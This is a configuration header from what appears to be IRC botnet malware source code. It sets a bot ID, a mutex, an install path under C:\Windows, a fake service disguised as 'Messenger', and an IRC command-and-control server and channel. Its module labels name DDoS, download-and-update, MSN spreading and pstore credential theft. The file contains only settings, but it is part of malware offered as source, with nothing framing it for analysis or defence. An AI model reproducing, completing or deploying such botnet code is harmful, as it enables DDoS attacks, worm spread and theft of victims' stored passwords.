char xetumhandle[]		= "fghh8aeg0";			//*mutex handle
char bid[]			= "dsggtnr-crew";	//*bot id
char prefix			= '.';				//*command prefix
char gotopth[]			= "C:\\Windows\\";		//*path to move to
char exename[]			= "BINARy.exe";
char password[]			= "dsgwgse3";
char authhost1[] 		= "*@*";
char *authost[] 		= { authhost1 };		//*!*@*


char servicename[]		= "Messenger";
char servicedisplayname[]	= "Messenger";
char servicedesc[]		= "Messenger";


SERVER sinfo[]={
//		{
//			
//			"irc.example.com",			//server
//			"letmein",				//pass
//			6667,					//port
//			"#privx",				//mainchan
//			"uNk",					//key
//			"-ix",					//modeonconn
//			"-ix",					//modeonjoin
//			//dont worry about the other normal config settings (sniff chan etc) they are removed.
//		},
		{ "n0biedns.lol.you.suck.lol.com","",1148,"#channel","password","+ix","+ix",},
};

char main_title[]		= "[main]:";
char ddos_title[]		= "[ddos]:";
char threads_title[]	= "[threads]:";
char irc_title[]		= "[irc]:";
char download_title[]	= "[download]:";
char update_title[]		= "[uptdate]:";
char logic_title[]		= "[logic]:";
char msnspread_title[]	= "[msn]:";
char pstore_title[]		= "[pstore]:";
char visit_title[]		= "[visit]:";
